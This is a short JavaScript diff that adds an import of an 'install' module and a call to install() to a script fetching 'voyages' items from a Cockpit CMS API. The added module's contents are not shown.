@@ -1,3 +1,5 @@
+import install from 'install.js'
+
 async function fetchVoyage() {
   try {
     const res = await fetch('https://ingrwf12.cepegra-frontend.xyz/cockpit1/api/content/items/voyages');
@@ -14,3 +16,5 @@ async function fetchVoyage() {
 }
 
 fetchVoyage();
+
+install()
